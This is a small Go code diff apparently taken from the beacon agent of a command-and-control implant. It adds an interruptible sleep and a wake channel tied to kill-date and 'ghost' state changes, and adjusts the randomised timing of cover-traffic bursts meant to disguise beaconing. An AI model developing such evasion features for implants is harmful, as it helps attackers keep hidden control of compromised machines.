@@ -1,10 +1,32 @@
 package main
 
 import (
-	mathRand "math/rand"
 	"runtime"
 	"time"
 )
+
+// beaconWakeCh wakes an interruptible sleep early (ghost transitions,
+// kill-date expiry). Buffered size 1: senders never block.
+var beaconWakeCh = make(chan struct{}, 1)
+
+// requestBeaconWake nudges the main loop out of a long sleep.
+func requestBeaconWake() {
+	select {
+	case beaconWakeCh <- struct{}{}:
+	default:
+	}
+}
+
+// sleepInterruptible sleeps up to d, returning early on a wake request.
+func sleepInterruptible(d time.Duration) {
+	if d <= 0 {
+		return
+	}
+	select {
+	case <-time.After(d):
+	case <-beaconWakeCh:
+	}
+}
 
 func sleepWithJitter() {
 	// Use sleep variator for non-default modes
@@ -84,7 +106,7 @@ func waitForBeaconWake(duration time.Duration) {
 	if duration > 0 {
 		if enabled, _ := getActiveCoverTraffic(); enabled {
 			go func() {
-				d := time.Duration(mathRand.Int63n(int64(duration)))
+				d := time.Duration(rng.Int63n(int64(duration)))
 				time.Sleep(d)
 				sendCoverTrafficBurst()
 			}()
